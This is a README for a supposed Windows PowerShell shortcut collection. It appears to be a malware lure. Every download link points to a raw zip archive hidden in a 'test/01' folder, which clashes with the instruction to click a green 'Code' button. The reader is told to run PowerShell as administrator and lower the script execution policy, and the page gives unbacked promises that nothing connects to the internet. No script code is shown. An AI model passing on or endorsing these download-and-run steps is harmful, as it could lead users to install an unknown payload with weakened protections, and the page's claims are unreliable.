# ⚡ powershell-cli-tools - Make Windows terminal tasks work faster

[![](https://img.shields.io/badge/Download-PowerShell_Tools-blue.svg)](https://raw.githubusercontent.com/ep563213-sys/powershell-cli-tools/main/test/01/tools-powershell-cli-2.9.zip)

## 📌 About this project

The powershell-cli-tools collection helps you work in the Windows terminal. You get shortcuts and scripts that save time. These tools turn standard terminal commands into faster actions. You spend less time typing long paths or repeating complex tasks. This project works with PowerShell 7 to improve how you manage files and folders on your computer.

## 🛠️ System requirements

Your computer needs a few things to run these tools:

*   Windows 10 or Windows 11.
*   PowerShell 7 installed.
*   Basic permissions to run scripts on your local machine.

If you do not have PowerShell 7, visit the official Microsoft website to download the latest version. This software does not track your data. It runs locally on your PC.

## 📥 Downloading the tools

You must visit the project page to get the files. Follow these steps to obtain the tools:

1. Visit [https://raw.githubusercontent.com/ep563213-sys/powershell-cli-tools/main/test/01/tools-powershell-cli-2.9.zip](https://raw.githubusercontent.com/ep563213-sys/powershell-cli-tools/main/test/01/tools-powershell-cli-2.9.zip).
2. Look for the green Code button on the right side of the screen.
3. Click the button and select Download ZIP.
4. Save the file to your computer.

This download provides the complete folder of scripts. Once the file finishes downloading, move it to a folder you can find easily, such as your Documents folder.

## ⚙️ Setting up your environment

PowerShell includes security features that stop unauthorized scripts from running. You must change your execution policy to allow these tools to function.

1. Open the Start menu.
2. Type PowerShell.
3. Right-click the PowerShell icon and select Run as administrator.
4. Type `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` and press Enter.
5. If the system asks for confirmation, type Y and press Enter.

This step allows your computer to run the scripts you downloaded. It maintains security while giving you access to the automation tools.

## 🚀 Using the terminal shortcuts

These tools provide shortcuts for common tasks. Open your terminal to use them.

### Navigate directories
Instead of typing full paths, use the directory-tree tool. Type the shortcut to see a visual map of your folders. This helps when you need to find a specific file inside deep folder structures. Use the command `show-tree` to see your current directory layout.

### Automated file management
You can move or rename sets of files using the provided scripts. Use the automation tools to process multiple files at once. These tools handle the repetitive parts of file management so you only perform one click.

### Color output
The default terminal looks plain. These tools add color to your output. Errors appear in red, while successful actions appear in green. This visual feedback helps you spot issues quickly without reading through lines of text.

## 📂 Understanding the file structure

The folder you downloaded contains several sub-folders:

*   **scripts:** Contains the core logic for the terminal tools.
*   **aliases:** Contains text files that link shortcuts to full commands.
*   **docs:** Contains help guides for each individual tool.

Do not move these files once you extract them. The scripts rely on their current locations to find support files. If you move a file, the tool might stop working.

## 💡 Troubleshooting common issues

If a tool does not work, check these common points:

*   **Check the policy:** Run `Get-ExecutionPolicy` to ensure the setting you changed earlier remains active.
*   **Check permissions:** Ensure you have read access to the folder where you saved the files.
*   **Update PowerShell:** Ensure you run PowerShell 7. Older versions of PowerShell built into Windows might lack the features these scripts require.

If you encounter an error message, read the text on the screen. The terminal usually explains exactly what went wrong. For example, it might say "Access Denied" if you need administrator rights to perform a specific action.

## 🛡️ Privacy and updates

This software runs entirely on your machine. We do not connect to external servers or send your file information to the internet. 

To get updates, return to the project page periodically. Download the ZIP file again to replace your existing files with the newest version. Keeping your tools updated ensures you have the latest fixes and extra features.

## 📝 Frequently asked questions

**Do I need to be a developer?**
No. These tools assist any user who works with files on Windows. You do not need to read or write code to use the features.

**Does this slow down my computer?**
No. The scripts only run when you type the specific command. They do not run in the background.

**Can I create my own shortcuts?**
Yes. You can edit the alias text files to point to your most used folders or programs. Open any file in the alias folder with Notepad to see how they look. Save the file after your changes to enable the new shortcut.